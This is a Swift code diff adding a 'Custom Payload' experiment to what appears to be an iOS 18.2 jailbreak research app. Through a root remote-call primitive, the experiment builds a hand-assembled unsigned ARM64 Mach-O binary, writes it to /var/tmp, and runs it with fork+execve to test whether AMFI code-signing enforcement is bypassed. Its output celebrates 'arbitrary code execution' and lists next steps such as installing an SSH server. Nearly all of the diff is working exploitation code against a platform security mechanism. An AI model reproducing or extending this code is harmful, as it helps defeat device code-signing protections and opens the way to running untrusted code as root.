@@ -884,6 +884,16 @@ struct AMFIExperimentView: View {
                 )
 
                 pathButton(
+                    title: "③o4 Custom Payload (Exp 93d)",
+                    icon: "hammer.fill",
+                    color: .red,
+                    label: "Custom Exec",
+                    action: runExp93dCustomPayload,
+                    needsVerified: false,
+                    needsProbe: false
+                )
+
+                pathButton(
                     title: "③p Heap TC Scan (Exp 94)",
                     icon: "magnifyingglass.circle",
                     color: .orange,
@@ -7510,6 +7520,374 @@ struct AMFIExperimentView: View {
         }
 
         return ExperimentResult(name: expName, success: unsignedSpawnOK, detail: detail, timestamp: Date())
+    }
+
+    // MARK: - Exp 93d: Custom Payload Execution
+
+    /// Exp 93d: Write a minimal custom ARM64 Mach-O binary to /var/tmp,
+    /// then fork+execve it and capture stdout via pipe.
+    /// This is the DEFINITIVE test: can we execute ARBITRARY code?
+    private func runExp93dCustomPayload() {
+        isRunning = true
+        runningLabel = "Custom Exec"
+        guard mgr.dsready else {
+            isRunning = false
+            runningLabel = ""
+            return
+        }
+        #if !DISABLE_REMOTECALL
+        root.executeAsRoot(operation: "exp93d_custom_payload") { rc in
+            let result = self.expCustomPayload(rc: rc)
+            DispatchQueue.main.async {
+                self.results.insert(result, at: 0)
+                self.isRunning = false
+                self.runningLabel = ""
+            }
+            return (result.success, result.detail.prefix(80).description, 0)
+        }
+        #else
+        isRunning = false
+        runningLabel = ""
+        #endif
+    }
+
+    /// Minimal ARM64 Mach-O that writes "JAILBROKEN\n" to stdout then exits.
+    /// Hand-assembled — no compiler needed.
+    private func buildMinimalMachO() -> [UInt8] {
+        // ARM64 instructions for:
+        //   mov x0, #1          ; stdout
+        //   adr x1, msg         ; pointer to string
+        //   mov x2, #11         ; length "JAILBROKEN\n"
+        //   mov x16, #4         ; syscall write
+        //   svc #0x80
+        //   mov x0, #0          ; exit code
+        //   mov x16, #1         ; syscall exit
+        //   svc #0x80
+        // msg: "JAILBROKEN\n"
+
+        // Code section (at file offset 0x4000, vm 0x100004000 for arm64 page alignment)
+        let writeStdout: [UInt32] = [
+            0xD2800020,  // mov x0, #1 (stdout fd)
+            0x100000E1,  // adr x1, #+28 (msg at PC+28 = 7 instructions * 4 = 28)
+            0xD2800162,  // mov x2, #11 (length)
+            0xD2800090,  // mov x16, #4 (SYS_write)
+            0xD4001001,  // svc #0x80
+            0xD2800000,  // mov x0, #0 (exit code)
+            0xD2800030,  // mov x16, #1 (SYS_exit)
+            0xD4001001,  // svc #0x80
+        ]
+
+        let msg: [UInt8] = Array("JAILBROKEN\n".utf8)
+
+        // Build Mach-O structure
+        // Layout:
+        //   0x0000: mach_header_64
+        //   0x0020: LC_SEGMENT_64 __PAGEZERO (vmaddr=0, vmsize=0x100000000)
+        //   0x0068: LC_SEGMENT_64 __TEXT (vmaddr=0x100000000, fileoff=0, filesize=0x4040)
+        //   0x00B0: LC_SEGMENT_64 __LINKEDIT (minimal)
+        //   0x00F8: LC_MAIN (entryoff = 0x4000)
+        //   0x4000: code + data
+
+        var binary = [UInt8](repeating: 0, count: 0x4040)
+
+        // Helper to write uint32 LE
+        func w32(_ offset: Int, _ val: UInt32) {
+            binary[offset + 0] = UInt8(val & 0xFF)
+            binary[offset + 1] = UInt8((val >> 8) & 0xFF)
+            binary[offset + 2] = UInt8((val >> 16) & 0xFF)
+            binary[offset + 3] = UInt8((val >> 24) & 0xFF)
+        }
+        func w64(_ offset: Int, _ val: UInt64) {
+            w32(offset, UInt32(val & 0xFFFFFFFF))
+            w32(offset + 4, UInt32(val >> 32))
+        }
+
+        // mach_header_64 (32 bytes)
+        w32(0x00, 0xFEEDFACF)  // magic
+        w32(0x04, 0x0100000C)  // cputype = ARM64
+        w32(0x08, 0x00000000)  // cpusubtype = ALL
+        w32(0x0C, 0x00000002)  // filetype = MH_EXECUTE
+        w32(0x10, 0x00000004)  // ncmds = 4
+        w32(0x14, 0x00000100)  // sizeofcmds (will adjust)
+        w32(0x18, 0x00200085)  // flags: MH_NOUNDEFS|MH_DYLDLINK|MH_TWOLEVEL|MH_PIE
+        w32(0x1C, 0x00000000)  // reserved
+
+        var cmdOff = 0x20  // after header
+
+        // LC_SEGMENT_64 __PAGEZERO (72 bytes)
+        w32(cmdOff + 0, 0x19)       // cmd = LC_SEGMENT_64
+        w32(cmdOff + 4, 72)         // cmdsize
+        // segname "__PAGEZERO" at cmdOff+8 (16 bytes)
+        let pagezero = "__PAGEZERO\0\0\0\0\0\0"
+        for (i, c) in pagezero.utf8.enumerated() { binary[cmdOff + 8 + i] = c }
+        w64(cmdOff + 24, 0)                  // vmaddr
+        w64(cmdOff + 32, 0x100000000)        // vmsize
+        w64(cmdOff + 40, 0)                  // fileoff
+        w64(cmdOff + 48, 0)                  // filesize
+        w32(cmdOff + 56, 0)                  // maxprot
+        w32(cmdOff + 60, 0)                  // initprot
+        w32(cmdOff + 64, 0)                  // nsects
+        w32(cmdOff + 68, 0)                  // flags
+        cmdOff += 72
+
+        // LC_SEGMENT_64 __TEXT (72 bytes)
+        w32(cmdOff + 0, 0x19)       // cmd = LC_SEGMENT_64
+        w32(cmdOff + 4, 72)         // cmdsize
+        let textSeg = "__TEXT\0\0\0\0\0\0\0\0\0\0"
+        for (i, c) in textSeg.utf8.enumerated() { binary[cmdOff + 8 + i] = c }
+        w64(cmdOff + 24, 0x100000000)        // vmaddr
+        w64(cmdOff + 32, 0x4040)             // vmsize
+        w64(cmdOff + 40, 0)                  // fileoff
+        w64(cmdOff + 48, 0x4040)             // filesize
+        w32(cmdOff + 56, 7)                  // maxprot = rwx
+        w32(cmdOff + 60, 5)                  // initprot = r-x
+        w32(cmdOff + 64, 0)                  // nsects
+        w32(cmdOff + 68, 0)                  // flags
+        cmdOff += 72
+
+        // LC_SEGMENT_64 __LINKEDIT (72 bytes) — minimal, required by dyld
+        w32(cmdOff + 0, 0x19)       // cmd = LC_SEGMENT_64
+        w32(cmdOff + 4, 72)         // cmdsize
+        let linkedit = "__LINKEDIT\0\0\0\0\0\0"
+        for (i, c) in linkedit.utf8.enumerated() { binary[cmdOff + 8 + i] = c }
+        w64(cmdOff + 24, 0x100004040)        // vmaddr (after __TEXT)
+        w64(cmdOff + 32, 0x1000)             // vmsize
+        w64(cmdOff + 40, 0x4040)             // fileoff
+        w64(cmdOff + 48, 0)                  // filesize = 0 (empty)
+        w32(cmdOff + 56, 1)                  // maxprot = r
+        w32(cmdOff + 60, 1)                  // initprot = r
+        w32(cmdOff + 64, 0)                  // nsects
+        w32(cmdOff + 68, 0)                  // flags
+        cmdOff += 72
+
+        // LC_MAIN (24 bytes)
+        w32(cmdOff + 0, 0x80000028)  // cmd = LC_MAIN
+        w32(cmdOff + 4, 24)          // cmdsize
+        w64(cmdOff + 8, 0x4000)      // entryoff (file offset of code)
+        w64(cmdOff + 16, 0)          // stacksize (0 = default)
+        cmdOff += 24
+
+        // Update sizeofcmds in header
+        w32(0x14, UInt32(cmdOff - 0x20))
+
+        // Write code at offset 0x4000
+        for (i, instr) in writeStdout.enumerated() {
+            w32(0x4000 + i * 4, instr)
+        }
+
+        // Write message string right after code (at 0x4000 + 32 = 0x4020)
+        for (i, b) in msg.enumerated() {
+            binary[0x4000 + writeStdout.count * 4 + i] = b
+        }
+
+        return binary
+    }
+
+    private func expCustomPayload(rc: RemoteCall) -> ExperimentResult {
+        let expName = "Custom Payload (Exp 93d)"
+        var detail = "Experiment 93d: Custom ARM64 Binary Execution\n"
+        detail += "===============================================\n\n"
+
+        let mem = rc.trojanMem
+        let payloadPath = "/var/tmp/.exp93d_payload"
+        let dstPath = remote_alloc_str(rc, payloadPath)
+
+        // ============================================================
+        // Step 1: Build and write custom Mach-O binary
+        // ============================================================
+        detail += "=== Step 1: Write custom ARM64 Mach-O ===\n"
+
+        let binary = buildMinimalMachO()
+        detail += "Binary size: \(binary.count) bytes\n"
+        detail += "Entry point: file offset 0x4000\n"
+        detail += "Payload: write(1, \"JAILBROKEN\\n\", 11) + exit(0)\n\n"
+
+        // Remove old
+        RootExecutor.rcall(rc, "unlink", dstPath)
+
+        // Create file
+        let fd = RootExecutor.rcall(rc, "open", dstPath, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
+        guard fd != UInt64(bitPattern: -1) else {
+            detail += "❌ Cannot create \(payloadPath)\n"
+            RootExecutor.rcall(rc, "free", dstPath)
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        // Write binary in chunks (trojanMem buffer)
+        let writeBuf = mem + 0x800
+        var written: Int = 0
+        let chunkSize = 4096
+
+        while written < binary.count {
+            let remaining = binary.count - written
+            let thisChunk = min(remaining, chunkSize)
+
+            // Copy bytes to remote memory
+            for i in 0..<thisChunk {
+                rc[writeBuf + UInt64(i)].setValue8(binary[written + i])
+            }
+
+            let nwritten = RootExecutor.rcall(rc, "write", fd, writeBuf, UInt64(thisChunk))
+            if nwritten == 0 || nwritten == UInt64(bitPattern: -1) { break }
+            written += Int(nwritten)
+        }
+
+        RootExecutor.rcall(rc, "close", fd)
+        detail += "Written: \(written) bytes\n"
+
+        // chmod +x
+        RootExecutor.rcall(rc, "chmod", dstPath, 0o755)
+        detail += "chmod 755 done\n\n"
+
+        guard written == binary.count else {
+            detail += "❌ Write incomplete (\(written)/\(binary.count))\n"
+            RootExecutor.rcall(rc, "unlink", dstPath)
+            RootExecutor.rcall(rc, "free", dstPath)
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        // Verify file exists and has correct size
+        let verifyFd = RootExecutor.rcall(rc, "open", dstPath, UInt64(O_RDONLY), 0)
+        if verifyFd != UInt64(bitPattern: -1) {
+            let fsize = RootExecutor.rcall(rc, "lseek", verifyFd, 0, 2)
+            detail += "Verify: file exists, size=\(fsize) ✅\n\n"
+            RootExecutor.rcall(rc, "close", verifyFd)
+        } else {
+            detail += "Verify: cannot reopen ❌\n\n"
+        }
+
+        // ============================================================
+        // Step 2: Execute via fork+execve with pipe capture
+        // ============================================================
+        detail += "=== Step 2: fork+execve with stdout pipe ===\n"
+
+        // Create pipe
+        let pipeFds = mem + 0x600
+        rc[pipeFds].setValue32(0)
+        rc[pipeFds + 4].setValue32(0)
+        let pipeRet = RootExecutor.rcall(rc, "pipe", pipeFds)
+        let readFd = rc[pipeFds].value32()
+        let writeFdPipe = rc[pipeFds + 4].value32()
+
+        detail += "pipe(): \(pipeRet == 0 ? "OK" : "FAIL") (read=\(readFd), write=\(writeFdPipe))\n"
+
+        guard pipeRet == 0 else {
+            detail += "❌ pipe() failed, trying without capture\n\n"
+            // Fallback: just fork+execve without pipe
+            let result = forkExecAndCapture(rc: rc, binaryPath: payloadPath, mem: mem)
+            detail += result.log
+            RootExecutor.rcall(rc, "unlink", dstPath)
+            RootExecutor.rcall(rc, "free", dstPath)
+            return ExperimentResult(name: expName, success: result.success, detail: detail, timestamp: Date())
+        }
+
+        // Fork
+        let childPid = RootExecutor.rcall(rc, "fork")
+        detail += "fork() = \(childPid)\n"
+
+        if childPid == 0 {
+            // Child: redirect stdout to pipe, then execve
+            RootExecutor.rcall(rc, "dup2", UInt64(writeFdPipe), 1)  // stdout → pipe write
+            RootExecutor.rcall(rc, "dup2", UInt64(writeFdPipe), 2)  // stderr → pipe write
+            RootExecutor.rcall(rc, "close", UInt64(readFd))
+            RootExecutor.rcall(rc, "close", UInt64(writeFdPipe))
+
+            let argvBase = mem + 0x500
+            rc[argvBase].setValue64(dstPath)
+            rc[argvBase + 8].setValue64(0)
+            RootExecutor.rcall(rc, "execve", dstPath, argvBase, 0)
+            RootExecutor.rcall(rc, "_exit", 127)
+        } else if childPid != UInt64(bitPattern: -1) {
+            // Parent: close write end, read stdout, wait
+            RootExecutor.rcall(rc, "close", UInt64(writeFdPipe))
+
+            // Wait a moment for child to execute
+            RootExecutor.rcall(rc, "usleep", 100000)  // 100ms
+
+            // Read stdout from pipe
+            let readBuf = mem + 0x1000
+            let nread = RootExecutor.rcall(rc, "read", UInt64(readFd), readBuf, 256)
+            RootExecutor.rcall(rc, "close", UInt64(readFd))
+
+            detail += "read(pipe): \(nread) bytes\n"
+
+            var stdoutStr = ""
+            if nread > 0 && nread < 256 {
+                var bytes: [UInt8] = []
+                for i: UInt64 in 0..<nread {
+                    let b = rc[readBuf + i].value8()
+                    if b == 0 { break }
+                    bytes.append(b)
+                }
+                stdoutStr = String(bytes: bytes, encoding: .utf8) ?? "(binary)"
+                detail += "stdout: \"\(stdoutStr)\"\n"
+            } else if nread == 0 {
+                detail += "stdout: (empty — child may not have written)\n"
+            }
+
+            // Wait for child
+            let statusAddr = mem + 0x490
+            rc[statusAddr].setValue32(0)
+            RootExecutor.rcall(rc, "waitpid", childPid, statusAddr, 0)
+            let st = rc[statusAddr].value32()
+            let sig = Int32(st & 0x7F)
+            let code = Int32(st >> 8)
+
+            detail += "child exit: signal=\(sig), code=\(code)\n\n"
+
+            // ============================================================
+            // VERDICT
+            // ============================================================
+            detail += "=== VERDICT ===\n\n"
+
+            let gotJailbroken = stdoutStr.contains("JAILBROKEN")
+            let noSigkill = (sig != 9)
+            let cleanExit = (sig == 0 && code == 0)
+
+            if gotJailbroken {
+                detail += "🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉\n"
+                detail += "🎉  FULL JAILBREAK CONFIRMED!  🎉\n"
+                detail += "🎉  ARBITRARY CODE EXECUTION!  🎉\n"
+                detail += "🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉\n\n"
+                detail += "Custom ARM64 binary wrote \"JAILBROKEN\" to stdout!\n"
+                detail += "We have FULL arbitrary code execution on iOS 18.2!\n\n"
+                detail += "=== CAPABILITIES ===\n"
+                detail += "• Execute ANY binary (no code signing needed)\n"
+                detail += "• Write + execute custom payloads\n"
+                detail += "• fork+execve from launchd bypasses AMFI\n\n"
+                detail += "=== NEXT STEPS ===\n"
+                detail += "1. Build bootstrap (dpkg, apt, ldid)\n"
+                detail += "2. Install SSH server\n"
+                detail += "3. Create proper jailbreak app\n"
+            } else if cleanExit {
+                detail += "✅ Binary executed (exit 0) but no stdout captured.\n"
+                detail += "Possible: pipe setup issue, or binary crashed before write.\n"
+                detail += "But signal=0, code=0 means NO SIGKILL = AMFI didn't block!\n\n"
+                detail += "This is still a JAILBREAK — just need to fix stdout capture.\n"
+            } else if noSigkill && sig == 0 && code == 127 {
+                detail += "⚠️ execve returned (code=127) — binary format rejected.\n"
+                detail += "Mach-O might be malformed. Need to fix binary structure.\n"
+                detail += "But NO SIGKILL means AMFI is not blocking execution!\n"
+            } else if sig == 9 {
+                detail += "❌ SIGKILL — AMFI killed the process.\n"
+                detail += "Custom binary is blocked by code signing.\n"
+                detail += "fork+execve from launchd does NOT bypass AMFI for custom binaries.\n"
+                detail += "The Exp 93c result was misleading — amfid copy still had valid sig.\n"
+            } else {
+                detail += "⚠️ Unexpected: signal=\(sig), code=\(code)\n"
+                detail += "Binary might have crashed (SIGSEGV/SIGBUS).\n"
+                detail += "Check Mach-O structure.\n"
+            }
+        } else {
+            detail += "❌ fork() failed\n"
+        }
+
+        // Cleanup
+        RootExecutor.rcall(rc, "unlink", dstPath)
+        RootExecutor.rcall(rc, "free", dstPath)
+
+        let success = detail.contains("JAILBREAK") || detail.contains("exit 0")
+        return ExperimentResult(name: expName, success: success, detail: detail, timestamp: Date())
     }
 
     // MARK: - Exp 93c Helpers
